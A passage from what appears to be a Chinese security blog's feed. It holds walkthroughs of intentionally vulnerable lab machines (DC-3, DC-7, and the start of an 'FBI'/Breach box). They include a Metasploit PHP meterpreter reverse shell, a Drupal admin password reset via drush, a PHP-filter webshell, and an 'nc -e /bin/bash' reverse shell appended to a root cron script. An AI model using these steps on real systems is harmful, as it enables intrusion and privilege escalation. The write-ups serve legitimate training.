class="line">msfconsole</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.0.22</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"><span class="comment">#然后浏览器访问 http://192.168.0.22/templates/beez3/1.php</span></span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.0.22</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.21:4444 -&gt; 192.168.0.22:55430) at 2020-04-29 16:43:47 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"><span class="comment"># 就连接上了</span></span><br><span class="line">meterpreter &gt; shell </span><br><span class="line"><span class="comment"># 进shell</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span> <span class="comment"># 获得标准shell</span></span><br></pre></td></tr></table></figure><ul><li><p>然后查看用户 <code>cd /home</code></p></li><li><p>发现只有一个dc3的用户</p></li><li><p>啥也没有</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null <span class="comment"># 找suid的文件</span></span><br></pre></td></tr></table></figure><ul><li><p>也没发现可以用的</p></li><li><p>只能试试系统提权了</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">uname -a <span class="comment">#查看内核信息</span></span><br><span class="line">Linux DC-3 4.4.0-21-generic <span class="comment">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line">cat /etc/*release <span class="comment">#查看版本信息</span></span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=16.04</span><br><span class="line">DISTRIB_CODENAME=xenial</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">"Ubuntu 16.04 LTS"</span></span><br><span class="line">NAME=<span class="string">"Ubuntu"</span></span><br><span class="line">VERSION=<span class="string">"16.04 LTS (Xenial Xerus)"</span></span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=<span class="string">"Ubuntu 16.04 LTS"</span></span><br><span class="line">VERSION_ID=<span class="string">"16.04"</span></span><br><span class="line">HOME_URL=<span class="string">"http://www.ubuntu.com/"</span></span><br><span class="line">SUPPORT_URL=<span class="string">"http://help.ubuntu.com/"</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">"http://bugs.launchpad.net/ubuntu/"</span></span><br><span class="line">UBUNTU_CODENAME=xenial</span><br></pre></td></tr></table></figure><ul><li>3772…无法下载….</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#dc-3靶机渗透&quot;&gt;DC-3靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-渗透过程&quot;&gt;1. 渗透过程&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#welcome-to-dc-3&quot;&gt;Welcome to DC-3.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#欢迎来到dc-3&quot;&gt;欢迎来到DC-3。&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DC-7 靶机渗透</title>
    <link href="https://atc96.top/DC-7/"/>
    <id>https://atc96.top/DC-7/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T10:23:54.688Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#dc-7-靶机渗透">DC-7 靶机渗透</a><ul><li><a href="#1-渗透过程">1. 渗透过程</a></li></ul></li><li><a href="#welcome-to-dc-7">Welcome to DC-7</a></li><li><a href="#staffdb">staffdb</a><ul><li><a href="#_the_end__"><em>THE_END!!!_</em></a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="dc-7-靶机渗透">DC-7 靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul><li>主机发现：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan --interface eth0 192.168.0.1/24</span><br></pre></td></tr></table></figure><ul><li><p>找到IP为： <code>192.168.0.28</code></p></li><li><p>扫描端口</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sS -A -p- 192.168.0.28</span></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-03 16:34 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.28</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)</span><br><span class="line">|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)</span><br><span class="line">|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-generator: Drupal 8 (https://www.drupal.org)</span><br><span class="line">| http-robots.txt: 22 disallowed entries (15 shown)</span><br><span class="line">| /core/ /profiles/ /README.txt /web.config /admin/</span><br><span class="line">| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/</span><br><span class="line">| /user/password/ /user/login/ /user/<span class="built_in">logout</span>/ /index.php/admin/</span><br><span class="line">|_/index.php/comment/reply/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Welcome to DC-7 | D7</span><br><span class="line">MAC Address: 00:0C:29:77:ED:69 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><ul><li><p>网站上有一段提示</p></li><li><blockquote><h1><span id="welcome-to-dc-7">Welcome to DC-7</span></h1><p>  DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are. :-)</p><p>  While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed.</p><p>  What you will have to do, is to think “outside” the box.</p><p>  Way “outside” the box. :-)</p><p>  DC-7引入了一些“新”概念，但我将让您弄清楚它们是什么。:-)</p><p>  虽然这个挑战并不完全是技术性的，但如果你需要诉诸暴力或字典攻击，你可能不会成功。</p><p>  你要做的，就是在盒子外思考。</p><p>  在盒子外面。:-)</p></blockquote></li><li><p>在网页的最下面有个 <strong>@DC7USER</strong></p></li><li><p>我这里没办法访问google</p></li><li><p>看的教程是个Twitter的用户</p></li><li><p>里面有一个链接：<code>https://github.com/Dc7User/staffdb</code></p></li><li><blockquote><h1><span id="staffdb">staffdb</span></h1><p>  This is some “code” (yes, it’s not the greatest code, but that wasn’t the point) for the DC-7 challenge.</p><p>  This isn’t a flag, btw, but if you have made it here, well done anyway. :-)</p><p>  这是一些DC-7挑战的“代码”（是的，这不是最棒的代码，但那不是重点）。</p><p>  这不是旗子，顺便说一下，但如果你在这里做得好，无论如何。:-)</p></blockquote></li><li><p>在这个项目里面有个config.php的文件</p></li><li><p>里面有账号和密码</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"dc7user"</span>;</span><br><span class="line">$password = <span class="string">"MdR3xOgB7#dW"</span>;</span><br><span class="line">$dbname = <span class="string">"Staff"</span>;</span><br><span class="line">$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>数据库的密码？？</p></li><li><p>然而没有数据库的入口啊</p></li><li><p>试试网站的后台</p></li><li><p>发现没用，再试试ssh</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh dc7user@192.168.0.28</span><br></pre></td></tr></table></figure><ul><li>进了~</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    # 只有两个东西</span><br><span class="line">    dc7user@dc-7:~$ ls</span><br><span class="line">    backups  mbox</span><br><span class="line">    cat mbox</span><br><span class="line">    From root@dc-7 Thu Aug 29 17:00:22 2019</span><br><span class="line">    Return-path: &lt;root@dc-7&gt;</span><br><span class="line">    Envelope-to: root@dc-7</span><br><span class="line">    Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">    Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">            (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">            id 1i3EPu-0000CV-5C</span><br><span class="line">            for root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">    From: root@dc-7 (Cron Daemon)</span><br><span class="line">    To: root@dc-7</span><br><span class="line">    Subject: Cron &lt;root@dc-7&gt; &#x2F;opt&#x2F;scripts&#x2F;backups.sh</span><br><span class="line">    MIME-Version: 1.0</span><br><span class="line">    Content-Type: text&#x2F;plain; charset&#x3D;UTF-8</span><br><span class="line">    Content-Transfer-Encoding: 8bit</span><br><span class="line">    X-Cron-Env: &lt;PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;sbin&gt;</span><br><span class="line">    X-Cron-Env: &lt;SHELL&#x3D;&#x2F;bin&#x2F;sh&gt;</span><br><span class="line">    X-Cron-Env: &lt;HOME&#x3D;&#x2F;root&gt;</span><br><span class="line">    X-Cron-Env: &lt;LOGNAME&#x3D;root&gt;</span><br><span class="line">    Message-Id: &lt;E1i3EPu-0000CV-5C@dc-7&gt;</span><br><span class="line">    Date: Thu, 29 Aug 2019 17:00:22 +1000</span><br><span class="line">    </span><br><span class="line">Database dump saved to &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql               [success]</span><br><span class="line">    gpg: symmetric encryption of &#39;&#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz&#39; failed: File exists</span><br><span class="line">    gpg: symmetric encryption of &#39;&#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql&#39; failed: File exists</span><br></pre></td></tr></table></figure><ul><li><p>备份网站和数据库的邮件？</p></li><li><p>先去<code>/var/mail</code>看看邮件是什么、</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">From root@dc-7 Tue Apr 28 23:15:34 2020</span><br><span class="line">Return-path: &lt;root@dc-7&gt;</span><br><span class="line">Envelope-to: root@dc-7</span><br><span class="line">Delivery-date: Tue, 28 Apr 2020 23:15:34 +1000</span><br><span class="line">Received: from root by dc-7 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-7&gt;)</span><br><span class="line">        id 1jTQ5G-0000ED-1F</span><br><span class="line">        for root@dc-7; Tue, 28 Apr 2020 23:15:34 +1000</span><br><span class="line">From: root@dc-7 (Cron Daemon)</span><br><span class="line">To: root@dc-7</span><br><span class="line">Subject: Cron &lt;root@dc-7&gt; &#x2F;opt&#x2F;scripts&#x2F;backups.sh</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;UTF-8</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">X-Cron-Env: &lt;PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;usr&#x2F;sbin&gt;</span><br><span class="line">X-Cron-Env: &lt;SHELL&#x3D;&#x2F;bin&#x2F;sh&gt;</span><br><span class="line">X-Cron-Env: &lt;HOME&#x3D;&#x2F;root&gt;</span><br><span class="line">X-Cron-Env: &lt;LOGNAME&#x3D;root&gt;</span><br><span class="line">Message-Id: &lt;E1jTQ5G-0000ED-1F@dc-7&gt;</span><br><span class="line">Date: Tue, 28 Apr 2020 23:15:34 +1000</span><br><span class="line"></span><br><span class="line">Database dump saved to &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql               [success]</span><br></pre></td></tr></table></figure><ul><li><p>这是计划任务的邮件</p></li><li><p>好像是会执行<code>/opt/scripts/backups.sh</code>文件</p></li><li><p>看看这个文件</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:/opt/scripts$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxr-x 1 root www-data 554 Apr 29 00:25 backups.sh</span><br><span class="line">dc7user@dc-7:/opt/scripts$ cat backups.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure><ul><li><p>只有root和www-data可以写入</p></li><li><p>现在只能获得写权限，看看写个木马什么的</p></li><li><p>想办法进www-data权限</p></li><li><p>找数据库连接文件</p></li><li><p>最后在 <code>/var/www/html/sites/default/setting.php</code>中发现数据库账号密码</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">....</span><br><span class="line">$databases[<span class="string">'default'</span>][<span class="string">'default'</span>] = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'database'</span> =&gt; <span class="string">'d7db'</span>,</span><br><span class="line">  <span class="string">'username'</span> =&gt; <span class="string">'db7user'</span>,</span><br><span class="line">  <span class="string">'password'</span> =&gt; <span class="string">'yNv3Po00'</span>,</span><br><span class="line">  <span class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">  <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">  <span class="string">'port'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">  <span class="string">'namespace'</span> =&gt; <span class="string">'Drupal\\Core\\Database\\Driver\\mysql'</span>,</span><br><span class="line">  <span class="string">'driver'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">);</span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>进数据库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udb7user -pyNv3Po00</span><br></pre></td></tr></table></figure><ul><li><p>找了一圈没发现账号密码<del>~</del></p></li><li><p>后来才知道 <code>/opt/scripts/backups.sh</code>文件里面有个drush命令，可以用来修改密码</p></li><li><p>drush命令使用：<a href="http://drupalchina.cn/node/3019" target="_blank" rel="noopener">http://drupalchina.cn/node/3019</a></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cd</span> /var/www/html;drush user-password admin --password=<span class="string">"1234"</span></span><br><span class="line">Changed password <span class="keyword">for</span> admin     [success]</span><br></pre></td></tr></table></figure><ul><li><p>然后我们登陆网站的后台</p></li><li><p>竟然没有写马的地方···</p></li><li><p><img data-src="../images/mdImages/image-20200503171416832.png" alt="image-20200503171416832"></p></li><li><p>后面得知可以安装一个模块</p></li><li><p>然后改用成可以使用写php文件的</p></li><li><p>记得勾选PHPfilter</p></li><li><p><img data-src="../images/mdImages/image-20200503171847681.png" alt="image-20200503171847681"></p></li><li><p>下面的format改成phpcode就可以写木马了</p></li><li><p>nc 监听 </p></li><li><p>就能反弹了</p></li><li><p>然后利用<code>www-data</code>把 <code>/opt/scripts/backups.sh</code> 添加一句</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br><span class="line">nc 192.168.0.21 8899 -e /bin/bash</span><br></pre></td></tr></table></figure><ul><li><p>再开一个nc监听。过一会就得到root权限了</p></li><li><p><img data-src="../images/mdImages/image-20200503173049525.png" alt="image-20200503173049525"></p></li></ul><h2><span id="the_end_"><em>THE_END!!!_</em></span></h2>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#dc-7-靶机渗透&quot;&gt;DC-7 靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-渗透过程&quot;&gt;1. 渗透过程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#welcome-to-dc-7&quot;&gt;Welcome to DC-7&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#staffdb&quot;&gt;staffdb&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#_the_end__&quot;&gt;&lt;em&gt;THE_END!!!_&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>FBI 靶机渗透</title>
    <link href="https://atc96.top/fbi/"/>
    <id>https://atc96.top/fbi/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T11:23:59.792Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#fbi靶机渗透">fbi靶机渗透</a><ul><li><a href="#1-渗透过程">1. 渗透过程</a></li><li><a href="#2-重要信息">2. 重要信息</a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="fbi靶机渗透">fbi靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul><li><p>给出了IP地址为固定的<code>192.168.110.140</code></p></li><li><p>而我当前上网的ip为:<code>192.168.0.101</code></p></li><li><p>这里给配置电脑两个IP地址</p></li><li><p>先配置一个静态然后点高级添加一个IP地址就可以了</p></li><li><p>下面开始收集信息</p></li><li><p>用nmap扫描端口 <code>nmap -v -A -oN /tmp/fbi.txt</code></p></li><li><p>扫描结果发现开启了1000个端口996个服务</p></li><li><p>显然这不正常</p></li><li><p>那我们直接去看看web: <code>http://192.168.110.140</code></p></li><li><p>主页的文字翻译：</p><blockquote><p>Initech被攻破，董事会投票决定聘请其内部的Initech网络咨询有限责任合伙公司分部提供协助。鉴于此次违约事件的高调性和近乎灾难性的损失，随后针对该公司的尝试也很多。Initech指派了由Bill Lumbergh、CISSP和Peter Gibbons，C | EH，SEC+，NET+，A+领导的顶级顾问来控制和分析漏洞。<br>该公司几乎没有意识到，这一漏洞不是熟练的黑客所为，而是一位心怀不满的前员工在离开时送给他的离别礼物。顶级顾问一直在努力控制漏洞。然而，他们自己的职业道德和留下的烂摊子可能是公司的垮台。</p></blockquote></li><li><p>好像没啥用….</p></li><li><p>F12看到这么一串东西看起来很像base64</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo -----&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>解密之后：<code>cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh</code>好像还是base64</p></li><li><p>再解密：<code>pgibbons:damnitfeel$goodtobeagang$ta</code></p></li><li><p>键值对？会不会是密码，发现主页的图片的超链接里面有个可以输入密码的</p></li><li><p>还真是密码</p></li><li><p>登录进去之后发现有三封未读的邮件</p></li><li><p>第一封:</p><blockquote><p>主题: <strong>Posting sensitive content</strong> (发布敏感内容)</p><p>内容: Peter, yeahhh, I’m going to have to go ahead and ask you to have your team only post any sensitive artifacts to the admin portal. My password is extremely secure. If you could go ahead and tell them all that’d be great. -Bill</p><p>彼得，是的，我得去问你，让你的团队只在管理门户上发布任何敏感的工件。我的密码非常安全。如果你能把一切都告诉他们那就太好了。-比尔</p></blockquote></li><li><p>第二封:</p><blockquote><p>主题:IDS/IPS system</p><p>内容:Hey Peter,</p><p>I got a really good deal on an IDS/IPS system from a vendor I met at that happy hour at Chotchkie’s last week!  -Michael</p><p>嗨，彼得，上周在Chotchkie的欢乐时光里，我遇到一个供应商，他给我提供了一个非常好的ID/IPS系统！  -迈克尔</p></blockquote></li><li><p>第三封</p><blockquote><p>  主题:FWD: Thank you for your purchase of Super Secret Cert Pro!</p><p>  ​         (FWD:感谢您购买超级机密证书专业版！)</p><p>  内容:Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob ——————————————————————————————————————————————- From: <a href="mailto:registrar@penetrode.com">registrar@penetrode.com</a> Sent: 02 June 2016 16:16 To: <a href="mailto:bob@initech.com">bob@initech.com</a>; <a href="mailto:admin@breach.local">admin@breach.local</a> Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!</p><p>  彼得，我不知道这是什么。我将文件保存在此处：192.168.110.140/.keystore Bob———————————–发件人：<a href="mailto:registrator@penetrode.com">registrator@penetrode.com</a>发送时间：2016年6月2日16:16收件人：<a href="mailto:Bob@initech.com">Bob@initech.com</a>；admin@break.local Subject:感谢您购买超级机密证书专业版！请查找附加的新SSL证书。不要和任何人分享！</p></blockquote></li><li><p>发现有一个证书保存在：<code>http://192.168.110.140/.keystore</code></p></li><li><p>keystore需要解析：<code>keytool -list -v -keystore keystore</code></p></li><li><p>但是需要密码…这密码是啥呢？</p></li><li><p>最后在<code>http://192.168.110.140/impresscms/modules/profile/index.php?uid=2</code>页面中找到一个</p></li><li><p><code>SSL implementation test capture</code>的超链接&gt;&gt;&gt;打开发现有一封邮件</p><blockquote><p>  Published by <a href="http://192.168.110.140/impresscms/modules/content/index.php?uid=2" target="_blank" rel="noopener">Peter Gibbons</a> on 2016/6/4 21:37:05. (0 reads)</p><p>  Team - I have uploaded a pcap file of our red team’s re-production of the  attack. I am not sure what trickery they were using but I cannot read  the file. I tried every nmap switch from my C|EH studies and just cannot figure it out. <a href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap" target="_blank" rel="noopener">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap</a> They told me the alias, storepassword and keypassword are all set to ‘tomcat’. Is that useful?? Does anyone know what this is? I guess we are securely encrypted now? -Peter p.s. I’m going fishing for the next 2 days and will not have access to email or phone.</p><p>  由[Peter Gibbons]出版（<a href="http://192.168.110.140/imprescms/modules/content/index.php?uid=2）2016年6月4日21:37:05。（0读）" target="_blank" rel="noopener">http://192.168.110.140/imprescms/modules/content/index.php?uid=2）2016年6月4日21:37:05。（0读）</a></p><p>  团队-我上传了一个关于红队重新制造攻击的pcap文件。我不知道他们在耍什么花招，但我看不懂文件。我试过从我的C | EH研究中的每一个nmap开关，但就是想不出来。<a href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap" target="_blank" rel="noopener">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap</a> 他们告诉我别名、存储密码和密钥密码都设置为“tomcat”。那有用吗？？有人知道这是什么吗？我想我们现在已经加密了？-彼得</p><p>  p.s.我将在接下来的两天里去钓鱼，我将无法使用电子邮件或电话。</p></blockquote></li><li><p>里面说存储密码和密钥密码都设置为“tomcat”而且是用于<a href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap的秘钥证书" target="_blank" 